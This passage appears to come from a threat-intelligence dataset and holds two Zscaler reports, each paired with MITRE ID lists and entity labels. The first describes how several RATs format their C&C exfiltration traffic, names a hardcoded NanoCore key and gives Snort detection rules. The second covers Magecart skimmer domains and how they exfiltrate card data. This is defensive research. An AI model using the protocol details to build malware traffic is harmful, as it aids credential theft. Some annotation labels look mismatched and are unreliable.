traffic.\n![](https://lh3.googleusercontent.com/McWJS_eN_K5qholLoB9qdc8ov8DeRV38MG1uGZ-_1F4rRmCrKiFUKo1rrV5YHo4yI1xUPFtw8z-h2sc7F-8C9_bIH8vW1FWxdKL2FVKRXBox2vL71qJsAnhSI4GDRslj74o8f3gI)\n*Fig.10: Data sent to C&C server as AES encrypted.*\nThe distinctive first 4 bytes of the payload can be used to identify Quasar traffic.\nSpecifically, the first 4 bytes can identify the first packet sent from the server to the client following the TCP handshake.\nThis packet is used to initiate the server/client authentication process.\nThe first 4 bytes of the TCP payload contain \"40 00 00 00\" which is the size of the data that follows in little endian.\n### **Agent Tesla RAT**\nThe Agent Tesla RAT has been very active and prevalent.\nOver the last couple of years, there have been huge ongoing phishing campaigns delivering Agent Tesla RAT.\nAgent Tesla has evolved over time, varying its behavior from campaign to campaign.\nCybercriminals use this RAT to steal user credentials and spy on victims through screenshots, keyboard logging, and clipboard capturing.\nCredential stealing is supported across various software ranging from browsers to mail clients, VPNs, and wallets.\nAgent Tesla communicates and exfiltrates data to its C&C server on HTTP, FTP, SMTP, and Telegram API.\nAll collected data is encapsulated into an HTML page, and that HTML page is sent to a C&C over one of the aforementioned protocols.\nFor communication over FTP, the HTML page is sent as a file to an FTP C&C server.\nThe file name is generated in format \u201cPW\\_<UserName>\\_<OS>\\_<Timestamp>.HTML\u201d\n![](https://lh5.googleusercontent.com/Y2YwbsGuKtRdA_tsmpFz6qgeMTmxXwe-zF7sgYpReVYihtEZu9w08FFi-yJ5qzMCnwYd4r6fzrGcDDUroOywVfewZonLRNFxZwPQphavAwcr0ADmVNNUqlNrHIi-rJPmfDqtapIU)\n*Fig.11: Data to be sent via FTP.*\n![](https://lh3.googleusercontent.com/8F2MVgT3zx-6rcHGYEHNkJp9wj610xCU0yscksACAnADDhWCNdNZ7sBkzjHrsY1PLAGurtUGTjlBBf4TQTK-P4Jxq42mm0_1A0-LpwsP373wrC6lYZOS9sgarmgIl3Auq8CzRQy0)\n*Fig.12: Exfiltration over FTP*\nFor communication over SMTP, the HTML page is sent as a mail body to the C&C server.\nThe mail subject is generated in format \u201cPW\\_<UserName>/<ComputerName>\u201d.\n![](https://lh3.googleusercontent.com/KYoapIP64WbQl-mIxxYgRLvQSfgBJKwb9u8jg2zaJVJgaaSrRvsgJO3Hau49yWAr9H4VeOfc1l5f_viEFHZkKKUwEEyQc1WufV2JPf5vDBjadrOkgLSp1Wcj9hEJrTJ53a7sHfjA)\n*Fig.13: Exfiltration over SMTP*\n### **CyberGate RAT**\nCyberGate allows an attacker to browse and manipulate files, devices, and settings on the victim's machine as well as download and execute additional malware.\nIt also has a wide range of information-stealing abilities including browser credential theft, keylogging, screen capture, and remote enabling of webcams.\nThe CyberGate RAT communicates on a custom protocol over TCP.\nCyberGate\u00a0collects the info as per the command received from the C&C server, compresses data by ZLib, encrypts it by RC4 with a hardcoded key, and then sends it to the C&C server.\n![](https://lh5.googleusercontent.com/w7yMadYDfy63uAqE1g1xU9jgXCwXmDTdXnlH9nKlKi6vHxwnMVdpW2yTY_Yc0RENUtNHigOp-bqQ9xcdhsLtcU3gza8f2Gl48_C--ecJSnlc4CIvPjpB1geOiwUYVHBwb8S1Vjmj)\n*Fig.14: Compressed and Encrypted data sent to C&C.*\nPackets begin with the data length followed by a marker then by a new line delimiter followed by encrypted data.\nTo flag the CyberGate RAT traffic, a combination of data length, marker, and delimiter can be considered.\n### **NanoCore RAT**\nThough NanoCore RAT emerged almost a decade ago, it is still one of the most prevalent RAT families, and multiple versions have appeared since then.\nNanoCore RAT is modular malware which comes with plugin support to expand its functionality.\nBasic plugins feature remote surveillance via remote desktop, monitor webcam, capture audio, etc.\nAdditional plugins have been found to be used for cryptocurrency mining, ransomware attacks, credential stealing, and more.\nNanoCore RAT has been found to be delivered via phishing emails containing .doc macros that load a NanoCore binary with fileless infection techniques.\nNanoCore communicates on a custom protocol over TCP and uses the DES algorithm with hardcoded key and IV value to encrypt the communication between bot and its C&C server.\nThe communication packet begins with a 4-byte data length followed by DES-encrypted data of that length.\n![](https://lh3.googleusercontent.com/Kmhmv9brGs4R-gbEkuKh4W4GdCVsEFslRyxOrVNV9Rdgpc3wGLEf6QQhviCLHNkMet7yfp1Ft7YSbRSXC0v7_1LsEabrZQeWq2he2ZMpANYPyeCF7G6hLH7ZJqvVBNBM54GlQRXJ)\nFig.15: Encrypted data C&C communication\nIt is not possible to scan for patterns in DES-encrypted data.\nHowever, we observed that the publicly available bot builder does not have an option for configuring the DES key.\nThus, all samples generated from this bot-builder will have the same DES key, which is \u201c722018788C294897\u201d.\nThis results in some encrypted traffic that will be the same across all bots generated using the publicly available bot-builder.\nOne such command from the server is \u201cis alive\u201d which is 0x600; when encrypted with a key it will produce \u201cc1 c3 d0 32 43 59 a1 78\u201d.\nHowever, there are other customized bot-builders available underground that allow the user to configure the key.\nFor a more generic detection, we need to check for heuristics of data length value against TCP packet size and entropy of data.\nThe first response from the server will be always 0x24 bytes in length, and the first 4 bytes will always be \u201c20 00 00 00\u201d.\nThis response contains a GUID of plugins that the bot will load.\nThe bot responds back to this with 0x12 bytes data, which will always start with the 4-byte stream \u201c08 00 00 00\u201d.\nThese characteristics can be leveraged for detection.\n![](https://lh4.googleusercontent.com/4Az6eIbXS8nGOa0nXeVKw8ahmi2f46MSMsDp0IkUkhyeNdlLIAlDODx-tlGFKh6z6WLf8H18JFnWJAj8mOsAYP2jfo1Hg65SSyPvAJ-ANHCOwMS05rZ5D2LLb-qDoDDvJvnn1Z-w)\nFig.16: Fix length first response from C&C server.\n### **Gh0st RAT**\nGh0st is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors such as \u201c[TA459](https://attack.mitre.org/groups/G0062/)\u201d and\u00a0\u201c[APT18](https://attack.mitre.org/groups/G0026/).\".\nIts\u00a0features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more.\nThe source code of the\u00a0 Gh0stRAT is publicly available and attackers have customized it to suit their needs.\nThus, many variants have been discovered.\nGh0st communicates on a custom protocol over TCP.\nIt uses a sequential byte-to-byte encryption algorithm to encrypt communication with the C&C server.\nUpon execution, it collects system data such as system information, version, processor description, installed antivirus, etc.\nThen, a marker and data length are prepended to this data.\nFinally, collected data is encrypted with single-byte operation of XOR and SUB on each byte.\n![](https://lh4.googleusercontent.com/4LbGU33qsv7CmoSQurQlSHwWvXM7Ma3GRLeKAxXQbftHAIkXMF6EW5ucgwBdclY84Zq5-ZY0K1vwARPoCUS7fUUK4C1NTdnVBcF_2t6XwK56x9c4TwsdE5tQoKeteaX_lUESl0NS)\n*Fig.17: Collected data before encryption and after encryption.*\n### **njRAT**\nDiscovered almost a decade ago, njRAT, also known as Bladabindi, is the most active and prevalent remote access trojan.\nIt allows attackers to do surveillance and control the victim's computer.\nIts\u00a0features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more.\nnjRAT is mostly found to be delivered via phishing email campaigns containing malicious Word document attachments.\nIt is also found to be delivered by masquerading as a legitimate application installer uploaded to file-sharing services and luring victims via drive-by download campaigns.\nSince the leak of source code 2013, njRAT has become widely adopted by cybercriminals and APT actors including\u00a0[Gorgon Group](https://attack.mitre.org/groups/G0078/)\u00a0and\u00a0[APT41](https://attack.mitre.org/groups/G0096/).\nNumerous variants have been detected over the years.\nSome variants have been found to be communicating over standard HTTP protocol and others were found to be communicating over custom protocols over TCP.\nThe packet begins with data length in a decimal format null-terminated string followed by command and then delimiter followed by exfiltrated data.\n![](https://lh6.googleusercontent.com/Q9ONmRNh0G3xnn2RPK3XQs9oRlGKpb8izMFU7exiDBuTNfSuCJxI6FWKlGsCgEN6s3lmozlZapJ3wjin-jZAYFSeQYvJBxvvBpeHe9flzbDgTdAqUeyWDCheWfPpwtyACyfM-rBR)\n*Fig.18: Fix length first response from C&C server.*\n### **Coverage:**\nZscaler\u2019s multilayered cloud security platform detects indicators at various levels.\nThe following are the Cloud IPS (non-HTTP/S) signatures that enable detection of the above RATs:\n[Win32.Backdoor.RemcosRAT](https://threatlibrary.zscaler.com/threats/4461cfa5-4155-499b-a1b5-e866cd05df97)\n[Win32.Backdoor.NetwiredRC](https://threatlibrary.zscaler.com/threats/8e9bd46b-2820-4f49-8b11-8712761e366d)\n[Win32.Backdoor.CrimsonRAT](https://threatlibrary.zscaler.com/threats/1d5c6832-d582-41cd-a050-e51251663138)\n[Win32.Backdoor.AsyncRAT](https://threatlibrary.zscaler.com/threats/2a3c4fd0-57d3-4816-8ffe-400f95ba6f37)\n[Win32.Backdoor.QuasarRAT](https://threatlibrary.zscaler.com/threats/3e8d15d9-287b-4ed2-ab16-fa58f7446a59)\n[Win32.Backdoor.AgentTesla](https://threatlibrary.zscaler.com/threats/35372622-693c-4166-8b6e-ccbf7f669cb5)\n[Win32.Backdoor.Cybergate](https://threatlibrary.zscaler.com/threats/6430f34a-aece-42ef-9435-c1bcc45a7f4b)\n[Win32.Backdoor.Nanocore](https://threatlibrary.zscaler.com/threats/51db83e0-80cf-4760-81a9-db4af507a5d8)\n[Win32.Backdoor.Gh0stRAT](https://threatlibrary.zscaler.com/threats/124cb8b3-bca5-420f-a4c5-71f4450d3ed3)\n[Win32.Backdoor.NjRat](https://threatlibrary.zscaler.com/threats/5056fbf2-0119-4348-9b26-59feccdd5bb7/)\n### **Conclusion**\nAll of the above-discussed RATs are communicating on custom and encrypted protocols over TCP.\nWhen communication is encrypted, it is more difficult to scan for their signature patterns in network traffic.\nHowever, we have discussed alternative ways to flag RAT traffic based on the heuristics of encrypted data.\nFour properties that are common to most RAT traffic on non-HTTP/S\u00a0are:\n1.Packets start with a length of encrypted data.\nAdding 4 to the little endian value of the first 4 should give the total length of TCP data.\n2.Entropy of data followed after data length is high.\n3.The C&C server responds in the same packet format as the client.\n4.Often, server responses have lengths in specific ranges as they send only commands.\nSnort Rules\n-----------\n*alert tcp $EXTERNAL\\_NET any -> $HOME\\_NET any (msg:\"Zscaler Win32.Backdoor.CrimsonRat - CNC command\"; flow:established,to\\_client; content:\"|00 00 00 00|\"; offset: 1; depth: 4; pcre:\"/\\x00\\x00\\x00\\x00(thumb|filsz|rupth|dowf|endpo|scrsz|cscreen|dirs|stops|scren|cnls|udlt|delt|afile|listf|file|info|runf|fles|dowr|info|fldr)+=/\"; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*\u00a0\n*alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler Win32.Backdoor.NetWiredRC - Check-in request\"; flow:established,to\\_server; dsize:69; content:\"|41 00 00 00 99|\"; offset:0; depth:5; flowbits:set,ZS.NetwireRAT.Client; flowbits:noalert; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)*\n*alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler Win32.Backdoor.NetWiredRC - Check-in response\"; flow:established,to\\_server; dsize:5; content:\"|3f 00 00 00 9b|\"; flowbits:isset,ZS.NetwireRAT.Client; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)*\n*alert tcp $EXTERNAL\\_NET any -> $HOME\\_NET any (msg:\"Zscaler Win32.Backdoor.AsyncRAT - Malicious SSL Cert\"; flow:established,to\\_client; content:\"|16 03 01|\"; offset:0; depth:3; content:\"AsyncRAT\"; distance:0; fast\\_pattern; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*\n*alert tcp $EXTERNAL\\_NET any -> $HOME\\_NET any (msg:\"Zscaler Win32.Backdoor.QuasarRAT - CNC response header\"; flow:established,to\\_client; dsize:68; content:\"|40 00 00 00|\"; offset: 0; depth: 4; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*\n*alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler Win32.Backdoor.AgentTesla CNC via FTP/SMTP\"; flow:established,to\\_server; content:\"|3C|html|3E|Time|3A|\"; content:\"|3C|br|3E|User Name|3A|\"; content:\"|3C|br|3E|Computer Name|3A|\"; distance: 0; content: \"|3C|br|3E|OSFullName|3A|\"; distance: 0; content:\"CPU|3A|\"; distance: 0; content:\"|3C|br|3E|RAM|3A|\"; distance: 0; content: \"URL|3A|\"; distance: 0; content: \"Application|3A|\"; distance: 0; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*\n*alert tcp $HOME\\_NET any -> any any (msg:\"Zscaler Win32.Backdoor.CyberGate - Data Exfiltration\"; flow:established,to\\_server; dsize:40<>300; pcre:\"/\\d{2,3}[#$]{4,6}\\x0d\\x0a/\"; content:\"|23 23 24 23 23 0d 0a|\"; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*\n*alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler Win32.Backdoor.Nanocore Pulse check\"; flow:established,to\\_server; dsize:12; content:\"|08 00 00 00|\"; offset: 0; depth: 4; content:\"*/*c1 c3 d0 32\u00a0 43 59 a1 78|\"; distance:0; within:8; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*\n*alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler Win32.Backdoor.Nanocore - Generic C&C command (request)\"; flow:established,to\\_server; flowbits:isset,ZS.NanocoreGen; dsize:12; content:\"|08 00 00 00|\"; offset:0; depth:4; byte\\_test:1,!=,0,5,relative;\u00a0 reference:url,https://zscaler.com;)*\n*alert tcp $EXTERNAL\\_NET any -> $HOME\\_NET any (msg:\"Zscaler Win32.Backdoor.Nanocore - Generic C&C command (response)\"; flow:established,to\\_client; flowbits:noalert; flowbits:set,ZS.NanocoreGen; content:\"|20 00 00 00|\"; offset:0; depth:4; byte\\_test:1,!=,0,5,relative; dsize:36; reference:url,https://zscaler.com;)*\n*alert tcp any any -> any any (msg:\"Zscaler Win32.Backdoor.Gh0stRAT - Possible Data Exfil activity\"; flow:to\\_server,established; byte\\_extract:1,10,varbyte; byte\\_test:1,!=,varbyte,11; byte\\_test:1,=,varbyte,12; byte\\_test:1,=,varbyte,13; byte\\_test:1,!=,varbyte,15; byte\\_extract:4,16,vardword; byte\\_test:4,=,vardword,20; byte\\_test:4,=,vardword,24; byte\\_test:4,=,vardword,28; byte\\_test:4,!=,vardword,0; sid:8000031; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*\n*alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler Win32.Backdoor.NjRat - Data Exfil activity\"; flow:to\\_server,established; content:\"|00|inf\"; offset:3; depth:4; pcre:\"/\\d{1,3}\\x00\\w{1,3}/\"; pcre:\"/(?:[A-Za-z0-9+\\/]{4})*(?:[A-Za-z0-9+\\/]{2}==|[A-Za-z0-9+\\/]{3}=)?/\"; flowbits:isset,ZS.njrat; flowbits:unset,ZS.njrat; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*\n*alert tcp $HOME\\_NET any -> $EXTERNAL\\_NET any (msg:\"Zscaler Win32.Backdoor.NjRat - Data Exfil activity\"; flow:to\\_server,established; content:\"|00|ll\"; offset:3; depth:3; pcre:\"/^\\d{1,3}\\x00/\"; pcre:\"/(?:[A-Za-z0-9+\\/]{4})*(?:[A-Za-z0-9+\\/]{2}==|[A-Za-z0-9+\\/]{3}=)?/\"; flowbits:set,ZS.njrat; flowbits:noalert; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*", "mitre_ids": ["T1437", "TA0011", "TA0011", "T1071", "TA0011", "TA0011", "T1071", "T1573", "T1573", "T1573", "T1071", "T1071", "T1559", "TA0011", "TA0011", "TA0011", "TA0011", "S0332", "S0332", "S0332", "G0078", "G0064", "S0332", "T1566", "TA0002", "T1056", "T1125", "T1027", "TA0011", "TA0011", "TA0011", "T1573", "T1027", "T1027", "S0332", "T1571", "TA0011", "TA0011", "T1571", "T1041", "TA0011", "T1041", "T1573", "T1573", "S0332", "TA0011", "T1041", "TA0011", "T1573", "T1573", "TA0011", "T1573", "S0332", "T1573", "S0115", "S0115", "S0115", "T1566", "TA0011", "T1041", "S0198", "S0198", "S0198", "G0083", "G0089", "S0198", "S0561", "T1105", "S0198", "T1071", "T1573", "TA0011", "TA0011", "TA0011", "T1573", "T1573", "S0198", "TA0011", "TA0011", "T1573", "TA0002", "T1056", "T1113", "T1566", "T1566", "T1190", "T1573", "TA0011", "TA0011", "S0262", "S0262", "G0078", "G0040", "T1056", "TA0006", "S0262", "T1573", "T1573", "TA0011", "T1573", "S0262", "S0331", "S0331", "S0331", "T1566", "S0331", "TA0006", "T1113", "T1056", "T1115", "TA0006", "S0331", "TA0011", "T1041", "T1071", "T1071", "T1071", "T1102", "TA0011", "T1041", "TA0011", "T1071", "T1071", "T1071", "T1071", "TA0011", "T1071", "T1071", "T1071", "T1565", "T1082", "T1105", "T1555", "T1056", "T1113", "T1125", "T1071", "TA0011", "TA0011", "T1041", "T1132", "T1573", "TA0011", "TA0011", "T1573", "TA0011", "S0336", "S0336", "S0336", "T1125", "T1123", "T1486", "T1496", "TA0010", "S0336", "S0336", "T1566", "S0336", "TA0011", "T1573", "T1573", "T1573", "TA0011", "T1573", "T1573", "T1573", "TA0011", "TA0011", "S0032", "S0032", "G0062", "G0026", "TA0006", "T1123", "T1021", "T1056", "T1125", "S0032", "TA0011", "T1573", "TA0007", "T1082", "T1082", "T1082", "T1518", "S0385", "S0385", "S0385", "TA0009", "T1021", "T1123", "T1056", "TA0006", "T1125", "S0385", "T1566", "T1036", "T1189", "S0385", "G0078", "G0096", "T1071", "T1071", "TA0010", "TA0011", "TA0011", "T1071", "T1573", "T1573", "TA0011", "TA0011", "TA0011", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "T1059", "TA0011", "T1059", "T1059", "TA0011", "TA0011", "T1059", "T1059", "TA0011", "T1059", "T1059", "T1059", "T1059"], "anno_name_label": [["TECHNIQUE", "Asymmetric Cryptography"], ["MALWARE", "AsyncRAT"], ["MALWARE", "AsyncRAT"], ["MALWARE", "AsyncRAT"], ["MALWARE", "AsyncRAT"], ["MALWARE", "AsyncRAT"], ["MALWARE", "AsyncRAT"], ["MALWARE", "AsyncRAT"], ["MALWARE", "CyberGateRAT"], ["MALWARE", "CyberGateRAT"], ["MALWARE", "CyberGateRAT"], ["MALWARE", "CyberGateRAT"], ["MALWARE", "CyberGateRAT"], ["MALWARE", "AsyncRAT"]], "cti_entity_class": ["CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI"]}, {"cti_report": "Magecart Attacks in 2021\nMay 11, 2021\nSkimmer groups are growing rapidly and targeting various e-commerce platforms using a variety of ways to remain undetected.\nThe Zscaler ThreatLabZ\u00a0research team has been tracking these skimmer groups and monitoring the techniques they're using.\nThe latest techniques include compromising vulnerable versions of e-commerce platforms, hosting skimmer scripts on CDNs and\u00a0cloud services, and using newly registered domains (NRDs) lexically close to any legitimate web service or specific e-commerce store to host malicious skimmer scripts.\nIn this blog, we will provide an overview of the recent trends we are seeing in JavaScript skimmer attacks.\nSkimming is a technique by\u00a0which cybercriminals steal credit card information from e-commerce sites and other internet payment portals.\nThreat actors exploit software vulnerabilities to gain\u00a0access to a website's source code.\nOnce they have access, they\u00a0inject malicious JavaScript that allows them to exfiltrate data.\nMagecart is an umbrella term used to describe these types of campaigns, which have been occurring\u00a0at least since 2015.\nThreatLabZ has observed a surge of these attacks in recent months:\n![Hits on compromised sites over 90 days](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/1.PNG)\nFigure 1: Hits on compromised sites over 90 days\nHistorically, the Magento platform has been the most highly targeted in skimmer attacks.\nThis trend continues with significant spikes in other e-commerce platforms as well.\n![Different e-commerce platforms targeted during the past two months.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/chart.png)\nFigure 2: Different e-commerce platforms targeted during the past two months.\n**Newly registered domains (NRDs) in skimmer attacks**\nThe use of NRDs in skimmer attacks for hosting malicious scripts\u00a0exfiltrating skimmed data\u00a0provides an advantage to attackers since each NRD's lack of reputation makes\u00a0it easy to evade\u00a0reputation-based engines.\nIn most attacks, newly registered domains are typosquatting for legitimate web services, such as Google ads, CDNs, Jquery, Magento, etc., as typosquatting increases the chance of remaining undetected in legitimate traffic.\nRecently, threat actors have most frequently utilized domains lexically close to Google and Google services, followed by domains lexically close to Jquery/ JavaScript and web analytics.\n![Trend for newly registered domains lexically close to legitimate services.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/3.PNG)\nFigure 3: Trend for newly registered domains lexically close to legitimate services.\n**URL categorization of targeted websites**\nWebsites in the shopping category are the most common targets for\u00a0skimmer attacks, but other URL categories have also fallen victim to these attacks, as shown in the following chart:\n![URL categories of impacted sites](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/4.PNG)\nFigure 4: URL categories of impacted sites\n**Abusing legitimate communication and analytics services in skimmer attacks**\nStarting last year, we've seen\u00a0skimmer groups abusing legitimate communication and analytics services, such as\u00a0Telegram and Google analytics, for data exfiltration.\nSome of these skimmer techniques can be defeated by configuring Content Security Policy (CSP).\nCSP\u00a0is an added layer of web security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks.\nThese attacks are used for everything from data theft to site defacement to distribution of malware.\nBy configuring CSP, web admins can specify domains that should be considered valid sources for scripts\u2014though such specifications can often be bypassed by attackers abusing the Google Analytics API, which is used legitimately by a large number of websites.\nThreatLabZ\u00a0observed a significant spike during February and March 2021 in such attacks, where legitimate communication and analytics services are abused, but they have trailed off in recent weeks.\n![Hits of skimmer groups abusing legitimate services over 90 days.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/5.PNG)\nFigure 5: Hits of skimmer groups abusing legitimate services over 90 days.\n**Recent skimmer activity**\nRecent skimmer attacks have heavily leveraged NRDs for malicious script injection and data exfiltration, as well as the use of compromised\u00a0third-party scripts or CDNs.\nBelow are two examples of recent skimmer attacks using NRDs and CDNs to serve\u00a0content to specific websites.\n**Case 1:** In one of the skimmer attacks, we observed two NRDs involved\u2014one for injecting malicious skimmer code and the other for data exfiltration.\nThese domains are lexically similar to the keywords *jquery* and *CDN*\u00a0to help attacks remain undetected in legitimate traffic.\nSkimmer Domain: jquery-ui[.]net\nCreation Date: \u00a02021-04-18\nIP: 34.125.186[.]248\nData Exfiltration Domain: cdn-cgi[.]net\nCreation Date: 2021-04-11\nIP: 34.125.186[.]248\n![Obfuscated skimmer script.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/6.PNG)\nFigure 6: Obfuscated skimmer script.\nThe skimmer script has a Base64-encoded fake payment page and skimmed data is sent to the attacker-controlled domain.\n![Data exfiltration domain and base64 encoded fake payment page.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/7.PNG)\nFigure 7: Data exfiltration domain and Base64-encoded fake payment page.\nCurrently, both of these NRDs are resolving to the same IP 34.125.186[.]248, which hosts multiple (possible) skimmer domains lexically close to legitimate services.\n![Multiple possible skimmer domains resolving to the same IP address.\n(Source: RiskIQ)](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/8.PNG)\nFigure 8: Multiple possible skimmer domains resolving to the same IP address.\n*(Source: RiskIQ)*\nIn the recent past, these domains resolved to the following IP addresses, each of which hosted\u00a0newly registered domains lexically close to legitimate domains and possibly connected to the skimmer attacks.\n![Suspicious IP addresses related to these domains (Source: RiskIQ)](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/9.PNG)\nFigure 9: Suspicious IP addresses related to these domains.\n(*Source: RiskIQ*)\nDuring our analysis of the above-mentioned IP addresses and domains, we observed that domain ajaxtracker[.]com was resolving to IP address 34.125.186[.]248 from April 26, 2021, to April 29, 2021, and during this time it was connected to the Raccoon Stealer.\n**Case 2**: We observed another recent chain of Magecart infections on a few German shopping websites.\nThe malicious JavaScript that was being used can be seen below.\n![Malicious skimmer script.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/10.PNG)\nFigure 10: Malicious skimmer script.\nOnce the malicious JavaScript is loaded it calls a function named \"Default\\_Send()\"\u00a0as shown\u00a0in the image below.\n![Function to grab all the inputs provided by the victim user](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/11.PNG)\nFigure 11: Function to grab all the inputs provided by the victim.\nThe Default\\_send function is responsible for collecting the URL of the infected page and grabbing all the inputs provided by the victim who is shopping on the compromised website.\n![Function to send victim\u2019s card details to attacker.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/12.PNG)\nFigure 12: Function to send victim\u2019s card details to attacker.\nOnce the script has collected the data, it will call the SendData function, which has the target URL to which the collected data will be uploaded.\nThe URL is stored in Base64-encoded format in the SendData function, as\u00a0displayed\u00a0below.\n![Base64 encoded data exfiltration domain.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/JSskimmer-2021/13.PNG)\nFigure 13: Base64 encoded data exfiltration domain.\nIf we decode the Base64 URL, we find that the data was being exfiltrated to the malicious domain google-sanek[.]com.\nBy doing a DNS lookup for the domain, we saw that the domain resolves to the IP\u00a082.148.31[.]214, which\u00a0helps us identify other domains hosted on the same IP involved with Magecart activity.\nA\u00a0few of the domains we observed over the last 30 days include\u00a0bing-analytics[.]com, google-sanek[.]com, google-worlds[.]com, google-worlds[.]com, and ssl-authorization[.]com.\nThe attacker serves JavaScript using\u00a0legitimate-looking domains\u00a0in an attempt to make the traffic look benign.\n**Conclusion**\nSkimmer groups continue to infect e-commerce sites in large numbers and improve techniques to remain undetected.\nThe use of newly registered domains lexically close to legitimate domains or services helps attackers evade reputation-based engines, as their domains are too new to have a low rating.\nIt is always recommended for buyers to use only known and legitimate e-commerce stores.\nZscaler ThreatLabZ actively tracks malicious campaigns and protects customers from skimming and other types of data-stealing attacks.", "mitre_ids": ["TA0005", "T1589", "T1190", "T1059", "T1566", "T1059", "T1059", "T1589", "T1190", "TA0010", "T1589", "T1589", "TA0010", "T1589", "T1059", "TA0005", "T1036", "T1036", "T1036", "T1036", "T1036", "T1190", "T1567", "T1589", "T1567", "T1589", "T1189", "TA0010", "T1491", "T1036", "T1036", "T1589", "T1036", "T1589", "T1036", "T1589", "TA0010", "T1589", "T1036", "T1589", "T1036", "T1589", "T1059", "TA0010", "T1036", "T1589", "T1027", "T1059", "T1132", "TA0010", "T1027", "T1027", "T1027", "T1036", "T1589", "T1589", "T1036", "T1589", "T1059", "T1059", "T1059", "T1059", "T1056", "T1056", "T1614", "T1056", "T1020", "T1020", "TA0009", "T1041", "T1027", "T1027", "TA0010", "TA0010", "T1027", "T1140", "T1041", "T1059", "T1036", "TA0005", "T1036"], "anno_name_label": [["TECHNIQUE", "Process Injection: Ptrace System Calls"], ["TECHNIQUE", "Process Injection: Ptrace System Calls"], ["TECHNIQUE", "Process Injection: Ptrace System Calls"], ["MALWARE", "Raccoon stealer"], ["MALWARE", "Magecart"], ["MALWARE", "Magecart"]], "cti_entity_class": ["CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CI"]}]